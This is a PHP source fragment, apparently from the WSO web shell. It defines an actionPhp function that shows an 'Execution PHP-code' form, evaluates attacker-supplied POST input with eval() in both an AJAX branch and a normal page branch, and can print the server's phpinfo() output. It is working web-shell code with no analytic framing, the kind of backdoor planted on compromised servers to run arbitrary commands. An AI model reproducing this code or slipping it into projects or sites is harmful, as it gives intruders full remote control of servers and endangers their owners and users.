<?php
function actionPhp() {
	if(isset($_POST['ajax'])) {
        WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax']) && !empty($_POST['p1']))
        WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);

	wsoHeader();
	if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
		echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace(array (
            '!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU',
            '!td, th {(.*)}!msiU',
            '!<img[^>]+>!msiU',
        ), array (
            '',
            '.e, .v, .h, .h th {$1}',
            ''
        ), $tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
    echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">';
	echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
	wsoFooter();
}
